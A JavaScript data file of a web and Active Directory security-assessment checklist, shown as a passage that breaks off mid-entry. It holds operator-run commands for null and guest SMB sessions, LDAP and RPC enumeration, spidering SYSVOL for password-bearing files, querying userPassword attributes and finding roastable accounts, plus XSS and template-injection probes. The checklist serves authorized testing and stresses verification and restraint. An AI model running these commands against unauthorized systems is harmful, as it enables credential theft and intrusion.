// Security assessment reference.
// Commands are operator-run examples; verification criteria distinguish discovery from demonstrated impact.
export const sections = [
  {
    "id": "web",
    "title": "Web",
    "intro": "Explore how the application works, change one thing at a time, and check whether the server allows something it should not.",
    "groups": [
      {
        "title": "Application & exposure",
        "items": [
          {
            "title": "Identify the real application",
            "check": "Open the site by IP and discovered hostname. Review redirects, page source, response headers, robots.txt, sitemap.xml, and linked JavaScript. Identify admin panels and API documentation.",
            "evidence": "URL, resolved IP, title, response status, product/version clues, redirects, and relevant routes.",
            "caveat": "A banner is a clue, not proof of an exploitable version. Different virtual hosts may serve different applications.",
            "command": "",
            "validation": "Discovery only: identify the correct application and virtual host. A banner or successful GET is not a vulnerability.",
            "guidance": "Browse the intended hostname, follow redirects and inspect page source, linked scripts and API documentation. Identify the users, private data and important actions. If the IP shows a default page, check the hostname before choosing tests.",
            "mode": "workflow"
          },
          {
            "title": "Exposed configs, source, and backups",
            "check": "Check a short, relevant list: /.env, /.git/HEAD, backup archives, database exports, old configuration copies, and directory listings.",
            "evidence": "Response content that demonstrates the file is real and sensitive; retain a minimal redacted sample.",
            "caveat": "Compare against a nonexistent path. HTTP 200, a redirect, or a login page does not establish exposure.",
            "command": "",
            "validation": "A response contains real configuration, repository metadata or backup content that the requesting identity should not read. A generic 200 page is not sufficient.",
            "guidance": "Look for configuration files, repository metadata and backups suggested by links or filenames. Open a promising result and inspect its contents. For an exposed secret, record the source and check what access it enables.",
            "mode": "workflow"
          },
          {
            "title": "Debug and management endpoints",
            "check": "Look for stack traces, debug mode, phpinfo, framework diagnostics, health endpoints, dashboards, Swagger/OpenAPI, and exposed monitoring data.",
            "evidence": "Endpoint and specific internal information or privileged functionality available.",
            "caveat": "API documentation and health checks can be intentionally public. Explain what sensitive capability or data is exposed.",
            "command": "",
            "validation": "Unauthenticated output contains sensitive diagnostics or exposes an administrative function. A health status alone is not a vulnerability.",
            "guidance": "Look for debug pages, detailed errors, API consoles and monitoring dashboards. Compare logged-out and normal-user access. Capture exposed secrets, private data or administrative actions and identify who should be allowed to access them.",
            "mode": "workflow"
          },
          {
            "title": "Public logs and diagnostic downloads",
            "check": "Check known application log/config routes and download functions discovered in links or source. Start with a small relevant list.",
            "evidence": "Actual log content, access identity, and the sensitive fields exposed.",
            "caveat": "Do not interpret every 200 as a file. Avoid publishing live tokens in screenshots.",
            "command": "",
            "validation": "The actual log content discloses sensitive information to an unintended identity. A generic 200/404 page is not proof.",
            "guidance": "Can an ordinary user download logs or diagnostic files? Follow the app’s links and download features, then inspect a small sample for tokens, passwords or other users’ data. Note who could access it and how a leaked value could be used.",
            "mode": "workflow"
          }
        ]
      },
      {
        "title": "Accounts & authorization",
        "items": [
          {
            "title": "Guest access and default accounts",
            "check": "Check what anonymous and guest users can read or do. Try documented product defaults when applicable and permitted; inspect self-registration and default roles.",
            "evidence": "Identity used, exact request, returned data or permitted action, and expected access boundary.",
            "caveat": "Coordinate login attempts and account creation. A public page or intentional guest access is not automatically a finding.",
            "command": "",
            "validation": "The anonymous request returns protected data or performs a protected action. Confirm the resource was intended to require authentication.",
            "guidance": "Save a working request for a private page, then make a second request without its login cookie or Authorization header. If the private data still appears, you may have an authentication bypass. Default passwords need a separate test through the application’s real login form.",
            "mode": "workflow"
          },
          {
            "title": "Can one user access another user’s records? (IDOR)",
            "check": "Using two controlled accounts, compare access to the same object and privileged action. Check APIs directly, not only which buttons the UI hides.",
            "evidence": "Paired requests showing the authorized baseline and unauthorized read/action.",
            "caveat": "Use test records and reversible changes. Different IDs alone do not prove an authorization flaw.",
            "command": "",
            "validation": "Account A receives B’s private object or performs an action reserved for B. Preserve both account identities and ownership proof.",
            "guidance": "Use two test accounts, A and B. While logged in as A, change a record ID in the request to one owned by B. If A can read or change B’s private record, save both requests and show who owns the record. This is commonly called IDOR.",
            "searchTerms": [
              "IDOR and role enforcement"
            ],
            "mode": "workflow"
          },
          {
            "title": "Can changing a role field grant extra access?",
            "check": "Inspect cookies, local storage, and request fields for role, owner, user ID, and tenant ID. Use controlled accounts to test server-side enforcement.",
            "evidence": "Before/after requests and the protected data or function newly accessible.",
            "caveat": "A UI change alone does not prove authorization bypass. Signed tokens cannot generally be edited without invalidating them.",
            "command": "",
            "validation": "The server grants new protected data or functionality because of the altered field. A changed UI or reflected field alone is insufficient.",
            "guidance": "Keep the same login session and change only the role, owner or organization field sent by the browser. Try a protected page or action afterward. Save the request and the private data or action newly accessible to that account.",
            "searchTerms": [
              "Client-controlled roles and identity fields"
            ],
            "mode": "workflow"
          },
          {
            "title": "Can one user export another user’s data?",
            "check": "Compare a normal user’s request with a request for a different controlled user’s record. Include export, search, and administrative API routes.",
            "evidence": "Both account contexts, record ownership, and the response crossing the boundary.",
            "caveat": "Use controlled records. Do not bulk-download unrelated customer data to prove one broken check.",
            "command": "",
            "validation": "The export or API response contains B’s protected records under A’s identity. A 200 response without the records is insufficient.",
            "guidance": "Keep account A’s login details, but request a report or export belonging to test account B. Check the downloaded contents for B’s private records. If they appear, record the request, both account identities and the affected data.",
            "searchTerms": [
              "Cross-user API reads and exports"
            ],
            "mode": "workflow"
          },
          {
            "title": "Does login or password reset reveal valid usernames?",
            "check": "Compare login, registration, and password-reset responses for a known test account and a nonexistent account. Inspect recovery and session invalidation behavior.",
            "evidence": "Repeatable differences in body, status, or timing and the practical abuse they enable.",
            "caveat": "Account names may already be public. Timing needs repeated measurements; avoid triggering mail floods or lockouts.",
            "command": "",
            "validation": "A repeatable semantic response difference reveals account existence. CSRF errors, random tokens and one timing difference do not prove enumeration.",
            "guidance": "Compare the same login or password-reset request for a known test username and a made-up one. Repeat to see whether messages such as “user not found” reliably reveal which accounts exist. Ignore changing tokens and minor page-size differences.",
            "searchTerms": [
              "Username enumeration and recovery"
            ],
            "mode": "workflow"
          },
          {
            "title": "Does a session still work after logout?",
            "check": "Check whether users can bypass workflow order, change protected fields, reuse invalidated sessions, or perform sensitive actions without appropriate reauthentication.",
            "evidence": "Expected workflow versus observed behavior, with the account/role and affected business action.",
            "caveat": "Test the application’s actual rules. Avoid inventing a requirement that the client does not have.",
            "command": "",
            "validation": "The invalidated session still performs the protected action, or skipping a required step changes protected application state. Confirm intended session semantics.",
            "guidance": "Save a request that works while logged in. Log out, then send that saved request again using the old cookie. If it still performs a protected action, the session may not have been invalidated. Check the action’s actual result, not just its HTTP status.",
            "searchTerms": [
              "Business logic and session boundaries"
            ],
            "mode": "workflow"
          }
        ]
      },
      {
        "title": "Input & uploads",
        "items": [
          {
            "title": "Can a forbidden file type be uploaded?",
            "check": "Review search fields, object parameters, uploads, exports, and URL-fetch features for injection, path traversal, unsafe rendering, and server-side requests.",
            "evidence": "Minimal reproducible request/response showing the relevant boundary was crossed.",
            "caveat": "A reflected string is not necessarily XSS; an error is not necessarily SQL injection. Establish execution context or data access.",
            "command": "",
            "validation": "The file bypasses the intended restriction and causes a concrete unintended read, rendering or execution capability. Acceptance alone does not prove execution.",
            "guidance": "Compare a normal upload with a harmless file using a forbidden extension or content type. Open the resulting upload and check how the server stores and serves it. Record whether you can read, render or execute something the feature should block.",
            "searchTerms": [
              "Input, upload, and URL handling"
            ],
            "mode": "workflow"
          },
          {
            "title": "SQL injection in APIs and non-form inputs",
            "check": "Review JSON fields, URL parameters, search/sort inputs, and payment or reporting endpoints. Compare a minimal controlled test with a baseline.",
            "evidence": "Paired requests showing query manipulation or a reproducible data boundary failure.",
            "caveat": "Do not infer SQL injection from a single error. Avoid data modification or full dumps as default validation.",
            "command": "",
            "validation": "A reproducible boolean true/false response difference is tied to the chosen parameter and a database query. Review the raw requests and false-positive controls before writing the finding.",
            "guidance": "Which inputs become part of a database lookup, filter or sort? Compare normal values with small, controlled changes in forms, URLs and JSON requests. Look for repeatable changes in returned records or database errors, then verify with a control. A single error is a lead, not proof of SQL injection.",
            "mode": "workflow"
          },
          {
            "title": "Does saved content run scripts for another user? (XSS)",
            "check": "Check posts, comments, profile fields, and administrative review views using controlled accounts.",
            "evidence": "Storage point, rendering context, second account/role, and actual browser behavior.",
            "caveat": "HTML injection and script execution are distinct. Use a harmless proof and remove test content.",
            "command": "",
            "validation": "The marker executes in the second account’s application origin. curl submission alone cannot prove browser execution; record the browser result and persistence.",
            "guidance": "Submit plain text, then a harmless HTML test such as <img src=x onerror=\"alert(1337)\">. Open the saved content in another test account’s browser. A popup there shows stored script execution, often called stored XSS. Submitting the text successfully is only the first step.",
            "searchTerms": [
              "Stored content rendered to another role"
            ],
            "mode": "workflow"
          },
          {
            "title": "Can URL imports reach restricted destinations? (SSRF)",
            "check": "Inspect profile-image imports, previews, webhooks, and document fetchers for server-side fetching and allowed schemes/destinations.",
            "evidence": "The input URL, observed server-side request or returned file, and any resulting secret exposure.",
            "caveat": "Start with a controlled endpoint. Local-file access, internal reachability, and RCE are different demonstrated outcomes.",
            "command": "",
            "validation": "A server-originated request reaches a destination the feature should forbid or discloses an internal response. Expected external fetching by itself is not SSRF.",
            "guidance": "Give an image importer or URL-fetch feature a unique URL on a server you control. Check whether the application’s server visits it. To establish SSRF, show it can reach a destination it should block; fetching an ordinary public image may be intended behavior.",
            "searchTerms": [
              "Remote image / URL import features"
            ],
            "mode": "workflow"
          },
          {
            "title": "File traversal and download authorization",
            "requires": "Application with a file path, document ID or download endpoint",
            "check": "Compare a permitted document with a controlled document outside the account or allowed directory. Distinguish a filesystem path bug from an object-ownership bug.",
            "command": "",
            "evidence": "Original and altered requests, account context and the exact file content returned.",
            "caveat": "An error mentioning a path is a lead. A successful response must contain the unintended file, not a generic success page.",
            "validation": "The response contains the actual unauthorized file. A path in an error, a redirect, or generic page is not proof.",
            "guidance": "Start with a file you can download normally. Change only its path to a harmless file outside the allowed folder, or its ID to another test account’s document. If that file’s real contents come back, save the request and explain why your account should not have access.",
            "mode": "workflow"
          },
          {
            "title": "Does the server evaluate your input as a template?",
            "requires": "Application feature that transforms user input",
            "check": "Establish a normal response, try a harmless arithmetic marker where templating is suspected, and repeat with a negative control. Identify the engine before considering a deeper proof.",
            "command": "",
            "evidence": "Input, response, rendering context and repeatable control comparison.",
            "caveat": "A computed value alone may be intended functionality. An error or timeout alone does not prove server-side execution.",
            "validation": "Repeatable server-side evaluation of controlled expressions or identity output supports an injection finding. Arithmetic output alone does not prove OS command execution.",
            "guidance": "Compare normal text with {{7*7}}, then {{7*8}}, in a field that might be processed by a template engine. Getting 49 and 56 is a useful lead if the server did the calculation. Identify the engine next; this alone does not show that operating-system commands can run.",
            "searchTerms": [
              "Server-side template and command evaluation"
            ],
            "mode": "workflow"
          },
          {
            "title": "Does XML input load external resources? (XXE)",
            "requires": "Endpoint that accepts XML or structured API input",
            "check": "Check accepted content types and parser behavior using a small document and a harmless local marker. If external resolution is suspected, use an approved callback endpoint and correlate the request.",
            "command": "",
            "evidence": "Raw input, parser response, unique marker and callback timestamp if observed.",
            "caveat": "Entity parsing does not itself prove file access or network reachability. Avoid large recursive documents and unbounded expansion.",
            "validation": "The parser resolves the external entity and returns its content or produces a correlated server-side callback. Internal entity expansion alone is not XXE.",
            "guidance": "Use this only when the application accepts XML. Compare its normal request with a small XML document that references a unique URL on your controlled server through an external entity. A matching server-side request can show unsafe XML handling (XXE). Parser errors alone do not prove it.",
            "searchTerms": [
              "XML and structured-input handling"
            ],
            "mode": "workflow"
          }
        ]
      },
      {
        "title": "Transport & credentials",
        "items": [
          {
            "title": "Transport, cookies, and browser controls",
            "check": "Review HTTPS behavior, certificate validation, sensitive cookies, caching of private responses, and security headers applicable to the app.",
            "evidence": "Affected endpoint/cookie and actual configuration; show a plausible consequence.",
            "caveat": "Missing headers are contextual. A JavaScript-readable non-session cookie or absence of cookies does not establish session theft.",
            "command": "",
            "validation": "Record the actual insecure cookie attribute, unencrypted sensitive response or certificate-validation failure and its impact. Missing optional headers alone may only be a hardening observation.",
            "guidance": "Watch the login and private-page traffic in your browser or proxy. Is sensitive data sent over HTTP? Do session cookies use Secure and HttpOnly where appropriate? Does private content remain available after logout? Explain the actual session or data risk rather than listing missing headers.",
            "mode": "workflow"
          },
          {
            "title": "Database credentials exposed by the app",
            "check": "Inspect accessible config/environment output and assess the database privileges of the exposed account.",
            "evidence": "Secret provenance, successful login if tested, effective database role, and reachable database.",
            "caveat": "The report’s chain ended inside a container as postgres; do not claim host root without evidence.",
            "command": "",
            "validation": "The recovered credential authenticates as the reported database identity. Separately establish why its source exposure and permissions are unintended.",
            "guidance": "Do configuration files, errors or debug pages reveal database credentials? Identify the intended database and account, then use the database checks to verify access. Separate the exposed-secret finding from any additional excessive permissions, and preserve where the credential was found.",
            "mode": "workflow"
          }
        ]
      }
    ]
  },
  {
    "id": "windows",
    "title": "Windows / AD",
    "intro": "Separate anonymous access, domain identities, local identities and administrative permissions.",
    "groups": [
      {
        "title": "SMB & shares",
        "items": [
          {
            "title": "SMB guest and anonymous access",
            "check": "Try anonymous and guest sessions separately. List shares, then inspect accessible directories and a minimal sample of relevant files.",
            "evidence": "Account/session used, share name, listing, and demonstrated file access.",
            "caveat": "Listing a share does not prove its contents are readable. Guest mapping is different from a true null session.",
            "command": "nxc smb {HOST} -u '' -p '' --shares\nnxc smb {HOST} -u 'guest' -p '' --shares",
            "validation": "A null/guest session receives unintended share or file access. Listing share names alone is not sensitive-file disclosure; preserve the session mapping.",
            "runOn": "Testing workstation · Bash",
            "guidance": "Try empty credentials and the guest account separately. Open a promising share, then read a small relevant configuration or backup file. Record the login used, file path and any exposed secret. Check whether the server mapped the session to guest."
          },
          {
            "title": "SMB version and signing",
            "check": "Record supported SMB dialects and whether signing is required. Identify hosts worth targeted follow-up.",
            "evidence": "Negotiated/configured protocol and signing result, target, and original output.",
            "caveat": "SMBv1 does not prove EternalBlue; optional signing alone does not prove a working relay chain.",
            "command": "nmap -Pn -p 445 --script smb-protocols,smb2-security-mode {HOST}",
            "validation": "The measured dialect/signing configuration violates the relevant requirement. Optional signing alone is not a demonstrated relay attack.",
            "runOn": "Testing workstation · Bash",
            "guidance": "Check for SMBv1 and whether signing is required. Signing protects SMB messages against tampering and is relevant to relay attacks. Record weak settings, check the client’s requirements and use the authentication-coercion checks to investigate a possible relay path."
          },
          {
            "title": "NXC guest share and password-policy checks",
            "check": "Use the guest account against one selected SMB host to inspect shares and any accessible policy information.",
            "evidence": "Host, guest authentication result, share/policy output, and tool version.",
            "caveat": "Guest may be denied or mapped differently. Lack of output is not proof that no shares or policy exist. CME compatibility varies by installed version.",
            "command": "nxc smb {HOST} -u 'guest' -p '' --shares\nnxc smb {HOST} -u 'guest' -p '' --pass-pol",
            "validation": "Guest can read unintended share/policy information. No output is inconclusive, and policy visibility does not itself establish weak passwords.",
            "runOn": "Testing workstation · Bash",
            "guidance": "Use guest access to look for shared configuration files or backups. Read the password policy before login tests so you know the lockout limits. Keep the guest login result and the specific data you could read."
          },
          {
            "title": "Authenticated SMB share review",
            "check": "Use a bare username and a separate domain in Command context. List shares, then list the selected SMB share with --share and --dir.",
            "evidence": "Identity, share ACL/access result, paths, and minimal sensitive-content evidence.",
            "caveat": "Run this block in Bash; read prompts for the password once. For a local account, replace -d and its domain argument with --local-auth. A directory listing is not proof of file-content access.",
            "command": "read -rsp 'SMB password: ' KISS_SMB_PASSWORD; echo\nnxc smb {HOST} -d {SMB_DOMAIN} -u {USER} -p \"$KISS_SMB_PASSWORD\" --shares\nnxc smb {HOST} -d {SMB_DOMAIN} -u {USER} -p \"$KISS_SMB_PASSWORD\" --share {SHARE} --dir\nunset KISS_SMB_PASSWORD",
            "validation": "The authenticated account can read specific data beyond its intended permissions. Listing filenames alone does not establish file-content access.",
            "runOn": "Testing workstation · Bash",
            "guidance": "Enter a bare username, domain and share, then supply the password when prompted. Inspect folders for files outside that account’s intended access. For a local account, replace -d and its domain argument with --local-auth. Save the relevant file path and contents."
          },
          {
            "title": "Shares, SYSVOL, descriptions, and service secrets",
            "check": "Re-enumerate shares as the account. Review deployment scripts, backups, AD descriptions, accessible credential attributes, service configs, and PowerShell history.",
            "evidence": "Location and identity used to access the secret; link recovered credentials to their source evidence.",
            "caveat": "Store originals appropriately and redact report excerpts. Do not assume an attribute name means a password can be read.",
            "command": "read -rsp 'Password: ' KISS_CHECK_PASSWORD; echo\nnxc smb {HOST} -d {SMB_DOMAIN} -u {USER} -p \"$KISS_CHECK_PASSWORD\" --spider {SHARE} --depth 2 --pattern .xml .ini .config .ps1 .bat\nunset KISS_CHECK_PASSWORD",
            "validation": "A readable file contains an actual credential or sensitive deployment information. Filename matches alone are leads; retrieve only the relevant file and record the identity that could read it.",
            "runOn": "Testing workstation · Bash",
            "setup": "Choose a relevant share such as SYSVOL. This lists matching paths; use nxc --share SHARE --get-file REMOTE LOCAL to read a selected file.",
            "guidance": "Search SYSVOL or another relevant share for configuration files and deployment scripts. Read a promising result with NXC’s --get-file option. Look for passwords, connection strings and service identities; record the source and test recovered credentials on their intended service."
          }
        ]
      },
      {
        "title": "LDAP & DNS",
        "items": [
          {
            "title": "Can LDAP return users without a login?",
            "requires": "Testing workstation; LDAP/DC host",
            "check": "Read RootDSE to learn naming contexts. Then use the returned base DN for a bounded anonymous query before claiming directory exposure.",
            "command": "ldapsearch -x -H {LDAP_URI} -s base -b '' '(objectClass=*)' namingContexts defaultNamingContext\nldapsearch -x -H {LDAP_URI} -b {BASE_DN} -z 5 '(objectClass=person)' dn",
            "evidence": "Bind identity, base DN, query, result code and returned attributes.",
            "caveat": "Public RootDSE metadata is common. A successful bind with no readable entries is different from anonymous access to users or sensitive attributes.",
            "references": [
              {
                "label": "Nmap: ldap-rootdse",
                "url": "https://nmap.org/nsedoc/scripts/ldap-rootdse.html"
              }
            ],
            "validation": "Actual dn/user entries and requested attributes are returned anonymously. RootDSE metadata, referrals, or result: 0 Success with zero entries do not demonstrate anonymous user reads.",
            "runOn": "Testing workstation · Bash",
            "guidance": "LDAP is the domain’s directory service. The first query asks for its base name; use the returned defaultNamingContext as the base DN for the second query. Actual user entries show anonymous reads. Referrals or “Success” with zero entries do not. RootDSE metadata is normally public.",
            "searchTerms": [
              "LDAP RootDSE versus anonymous directory reads"
            ]
          },
          {
            "title": "Locate DCs with DNS SRV records",
            "check": "Ask the configured DNS resolver for the AD domain’s LDAP DC records. Use returned hostnames as candidates, then confirm their role.",
            "evidence": "SRV answers and the resolver used.",
            "caveat": "A DNS zone is not necessarily an AD domain; no answers can also mean resolver or network failure.",
            "command": "dig {DNS_SERVER_ARG} {DC_SRV} SRV",
            "validation": "Discovery only: SRV records identify candidate DCs. Publishing these records is normal AD behavior.",
            "runOn": "Testing workstation · Bash",
            "guidance": "A domain controller (DC) handles domain accounts and authentication. These DNS records tell you which hosts provide that service. Use the returned hostname for later LDAP and Kerberos checks. Finding these records is normal, not a vulnerability."
          },
          {
            "title": "Domain, DC, and anonymous LDAP/RPC",
            "check": "Find the domain and DCs using DNS, SMB, LDAP RootDSE, and available RPC enumeration. Test whether directory objects are accessible anonymously.",
            "evidence": "Naming contexts, DC names, and actual directory/user data returned.",
            "caveat": "RootDSE is often intentionally readable. Record directory exposure separately from basic metadata.",
            "command": "ldapsearch -x -LLL -H {LDAP_URI} -s base -b '' '(objectClass=*)' namingContexts\nrpcclient -U '' -N {HOST}",
            "validation": "Anonymous RPC returns actual account/group information or LDAP returns actual directory entries. enumprivs lists the server privilege catalog, not privileges assigned to your session.",
            "runOn": "Testing workstation · Bash",
            "guidance": "Check basic domain information, then try enumdomusers or querydispinfo inside rpcclient. Returned users or descriptions may give you useful account names. The enumprivs command lists privilege names known to the server; it does not mean your anonymous session has those privileges."
          },
          {
            "title": "LDAP users and group memberships",
            "check": "Query account names, descriptions, group membership, and SPNs with the selected identity. Set base DN from namingContexts when needed.",
            "evidence": "Query, bind identity, account entries, and relevant membership/description attributes.",
            "caveat": "Use StartTLS here; a TLS failure is a configuration issue to investigate, not a reason to silently send a simple-bind password in cleartext.",
            "command": "ldapsearch -x -ZZ -LLL -H {LDAP_URI} -D {BIND_ID} -W -b {BASE_DN} '(&(objectCategory=person)(objectClass=user))' sAMAccountName description memberOf servicePrincipalName",
            "validation": "The identity reads information it should not access under the client’s policy. Normal authenticated AD user/group enumeration is not automatically a vulnerability.",
            "runOn": "Testing workstation · Bash",
            "guidance": "Use a known domain account to list usernames, descriptions and groups. Look for service accounts and descriptions containing useful configuration or secrets. Ordinary domain users can often read this information by design; report unexpected sensitive access, not just a successful query."
          },
          {
            "title": "Can your account read password-related LDAP fields?",
            "check": "Investigate accessible userPassword or custom credential-bearing attributes and why the querying account can read them.",
            "evidence": "Attribute name, ACL/access context, and validated nature of the decoded value.",
            "caveat": "LDIF uses base64 as a serialization format for many values. A double colon alone does not prove a plaintext password; base64 is not encryption.",
            "command": "ldapsearch -x -ZZ -LLL -H {LDAP_URI} -D {BIND_ID} -W -b {BASE_DN} '(userPassword=*)' dn userPassword",
            "validation": "The identity can read a sensitive credential-bearing attribute. Verify the value type and intended ACL; LDIF base64 alone does not mean encryption or a plaintext password.",
            "runOn": "Testing workstation · Bash",
            "guidance": "Look for readable password-related fields in user records. Identify what the value actually contains before testing it. In LDAP output, a double colon often means the value is base64-encoded; that is a storage format, not proof that it is an encrypted or plaintext password.",
            "searchTerms": [
              "LDAP sensitive attributes and encoding"
            ]
          },
          {
            "title": "Find accounts that run services (SPNs)",
            "check": "List SPN-bearing user accounts and their descriptions before choosing targeted service-account testing.",
            "evidence": "Account name, SPNs, query identity, and relevant configuration.",
            "caveat": "An SPN is normal AD functionality and does not prove password weakness. This query does not request service tickets or perform roasting.",
            "command": "ldapsearch -x -ZZ -LLL -H {LDAP_URI} -D {BIND_ID} -W -b {BASE_DN} '(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))' sAMAccountName servicePrincipalName description",
            "validation": "Discovery only: SPN-bearing users identify Kerberos testing candidates. An SPN alone does not prove a weak password or recovered credential.",
            "runOn": "Testing workstation · Bash",
            "guidance": "An SPN links a network service to its account. List the accounts and descriptions, then use the Kerberoasting check to request tickets for relevant service accounts. Keep the account name, service and resulting ticket evidence together.",
            "searchTerms": [
              "LDAP service-account SPNs"
            ]
          }
        ]
      },
      {
        "title": "Accounts & policy",
        "items": [
          {
            "title": "Default, blank, or supplied credentials",
            "check": "Test a small, justified set against selected services. Determine whether the account is local or domain-scoped; obtain password/lockout policy when possible.",
            "evidence": "Exact account context, target/protocol, result, timestamp, and supporting output.",
            "caveat": "Coordinate attempts across teammates. Never treat a timeout as a bad password or automatically spray every account.",
            "command": "read -rsp 'Password: ' KISS_CHECK_PASSWORD; echo\nnxc smb {HOST} -d {SMB_DOMAIN} -u {USER} -p \"$KISS_CHECK_PASSWORD\" --shares\nunset KISS_CHECK_PASSWORD",
            "validation": "The intended account authenticates with the tested default/blank credential and gains unexpected access. Verify guest mapping before attributing success to that account.",
            "runOn": "Testing workstation · Bash",
            "setup": "Use one justified account/password pair. For a blank password press Enter; for a local account replace -d and its argument with --local-auth.",
            "guidance": "Test one known or justified username/password pair. Press Enter at the password prompt to test a blank password. Check which identity actually logged in, since a server may map failed logins to guest. Use --local-auth instead of -d DOMAIN when the account belongs only to that machine."
          },
          {
            "title": "LDAP password and lockout policy",
            "check": "Read domain policy attributes to guide coordinated authentication checks.",
            "evidence": "Effective domain policy and whether fine-grained policy applies to the selected account.",
            "caveat": "Domain defaults may be overridden by fine-grained password policies. Do not infer safe attempt counts from a single attribute.",
            "command": "ldapsearch -x -ZZ -LLL -H {LDAP_URI} -D {BIND_ID} -W -b {BASE_DN} -s base minPwdLength lockoutThreshold lockoutDuration pwdProperties",
            "validation": "The effective policy for the account violates a defined requirement; confirm fine-grained policy before treating domain defaults as effective.",
            "runOn": "Testing workstation · Bash",
            "guidance": "Read the domain’s password-length and lockout settings before login testing. lockoutThreshold is the number of failed attempts that can lock an account. Some users have separate password policies, so check those too before assuming these defaults apply to everyone."
          },
          {
            "title": "Disabled, stale, and departed-user accounts",
            "check": "Compare enabled accounts with the client’s authoritative account lifecycle information.",
            "evidence": "Enabled status, ownership, confirmed departure/expiry context, and access still possible.",
            "caveat": "An old lastLogonTimestamp is a lead, not proof someone left the company or an account is unused.",
            "command": "ldapsearch -x -ZZ -LLL -H {LDAP_URI} -D {BIND_ID} -W -b {BASE_DN} '(&(objectCategory=person)(objectClass=user))' sAMAccountName userAccountControl accountExpires lastLogonTimestamp",
            "validation": "Authoritative client records identify an account that should be disabled but remains usable/enabled. A stale timestamp alone is insufficient.",
            "runOn": "Testing workstation · Bash",
            "guidance": "Compare the returned accounts with the team or client’s list of current users. An old login timestamp is only a lead. A useful finding identifies an account that should have been disabled but is still enabled or usable, and explains the access it retains."
          },
          {
            "title": "Is Windows automatic login enabled?",
            "check": "Inspect authorized local configuration and credential provenance. Verify relevant reuse on selected systems.",
            "evidence": "Configured autologon identity, secret source, and separately verified reuse.",
            "caveat": "Access to one local admin credential does not establish estate-wide compromise. Do not dump every credential as an opening check.",
            "command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon",
            "validation": "An unintended identity can read a stored reusable secret and verify its intended use. AutoAdminLogon=1 alone does not establish readable credentials.",
            "runOn": "Target Windows host · PowerShell or cmd",
            "guidance": "Run this on the Windows host to see whether automatic login is enabled. AutoAdminLogon=1 is a lead, not a password. Next inspect who can read the related login settings and whether a reusable secret is exposed. Record the account that could read it.",
            "searchTerms": [
              "Stored autologon and shared administrator passwords"
            ]
          },
          {
            "title": "Does this username exist in the domain?",
            "command": "read -rsp 'Domain password: ' KISS_CHECK_PASSWORD; echo\nnxc ldap {DC} -d {SMB_DOMAIN} -u {USER} -p \"$KISS_CHECK_PASSWORD\" --users {TARGET_USER}\nunset KISS_CHECK_PASSWORD",
            "guidance": "Use a known domain login in Command context. Enter the username you want to look up in the field below. A matching sAMAccountName means it is a domain account. This does not tell you its password or whether it is enabled; check those separately.",
            "check": "Use a known domain login in Command context; enter the account to look up below. A matching sAMAccountName confirms domain membership, not password validity or enabled status. No results can also mean insufficient directory access.",
            "validation": "Use a known domain login in Command context; enter the account to look up below. A matching sAMAccountName confirms domain membership, not password validity or enabled status. No results can also mean insufficient directory access.",
            "evidence": "Save the exact command, identity, target, tool version and raw result.",
            "caveat": "A transport or authentication error is inconclusive; verify the module actually ran.",
            "runOn": "Testing workstation · Bash",
            "references": [
              {
                "label": "NetExec reference",
                "url": "https://github.com/Pennyw0rth/NetExec/blob/main/nxc/protocols/ldap/proto_args.py"
              }
            ]
          },
          {
            "title": "Accounts with password-not-required flag",
            "command": "read -rsp 'Domain password: ' KISS_CHECK_PASSWORD; echo\nnxc ldap {DC} -d {SMB_DOMAIN} -u {USER} -p \"$KISS_CHECK_PASSWORD\" --password-not-required\nunset KISS_CHECK_PASSWORD",
            "guidance": "Find accounts marked as not requiring a password. The setting does not guarantee their current password is blank. Pick one relevant account for a single blank-password test, then check whether access is really granted as that user rather than guest.",
            "check": "Returns accounts with PASSWD_NOTREQD. This flag does not mean the password is blank. Follow up with one explicit blank-password check against a selected account and record guest mapping or lockout restrictions.",
            "validation": "Returns accounts with PASSWD_NOTREQD. This flag does not mean the password is blank. Follow up with one explicit blank-password check against a selected account and record guest mapping or lockout restrictions.",
            "evidence": "Save the exact command, identity, target, tool version and raw result.",
            "caveat": "A transport or authentication error is inconclusive; verify the module actually ran.",
            "runOn": "Testing workstation · Bash",
            "references": [
              {
                "label": "NetExec reference",
                "url": "https://github.com/Pennyw0rth/NetExec/blob/main/nxc/protocols/ldap/proto_args.py"
              }
            ]
          },
          {
            "title": "Fine-grained password policy",
            "command": "read -rsp 'Domain password: ' KISS_CHECK_PASSWORD; echo\nnxc ldap {DC} -d {SMB_DOMAIN} -u {USER} -p \"$KISS_CHECK_PASSWORD\" --pso\nunset KISS_CHECK_PASSWORD",
            "guidance": "Some users or groups have password rules that override the domain defaults. This command lists those separate policies. Check which accounts they apply to, especially before testing passwords or deciding that an account lacks lockout protection.",
            "check": "Lists password settings objects. Check which policy applies to the tested user before relying on domain-wide minimum length or lockout settings. Policy presence alone is not a vulnerability.",
            "validation": "Lists password settings objects. Check which policy applies to the tested user before relying on domain-wide minimum length or lockout settings. Policy presence alone is not a vulnerability.",
            "evidence": "Save the exact command, identity, target, tool version and raw result.",
            "caveat": "A transport or authentication error is inconclusive; verify the module actually ran.",
            "runOn": "Testing workstation · Bash",
            "references": [
              {
                "label": "NetExec reference",
                "url": "https://github.com/Pennyw0rth/NetExec/blob/main/nxc/protocols/ldap/proto_args.py"
              }
            ]
          }
        ]
      },
      {
        "title": "Kerberos, permissions & certificates",
        "items": [
          {
            "title": "Find accounts without Kerberos preauthentication",
            "check": "Identify SPNs and accounts without Kerberos preauthentication. Assess roastability and whether offline recovery yields useful credentials.",
            "evidence": "Account configuration, collected artifact reference, and separately recorded password-recovery result.",
            "caveat": "An SPN is normal. Roastability is not the same as a weak or recovered password. DNS and time errors can invalidate testing.",
            "command": "ldapsearch -x -ZZ -H {LDAP_URI} -D {BIND_ID} -W -b {BASE_DN} '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' sAMAccountName userAccountControl",
            "validation": "Returned accounts have the no-preauthentication flag. This supports a configuration finding; it does not prove password recovery or account compromise.",
            "runOn": "Testing workstation · Bash",
            "setup": "Use the LDAP result to select an individual account for a separate AS-REP test; do not treat normal SPN presence as a vulnerability.",
            "guidance": "This lists accounts that do not require Kerberos preauthentication, the usual initial proof that a user knows their password. Pick a returned username for the AS-REP roasting check. The flag identifies a candidate; a returned AS-REP hash confirms material is available for offline password testing.",
            "searchTerms": [
              "Service accounts and Kerberos"
            ]
          },
          {
            "title": "Can your account change a privileged AD object?",
